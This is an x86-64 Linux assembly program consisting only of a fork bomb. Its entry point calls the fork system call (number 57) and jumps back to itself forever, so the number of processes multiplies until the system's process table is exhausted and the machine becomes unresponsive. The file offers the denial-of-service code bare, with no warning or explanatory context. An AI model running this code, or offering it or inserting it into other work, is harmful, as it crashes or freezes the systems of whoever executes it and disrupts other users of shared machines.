section .text
    global _start
  
_start:
    mov rax, 57; sys_fork
    syscall
    jmp _start; endless loop
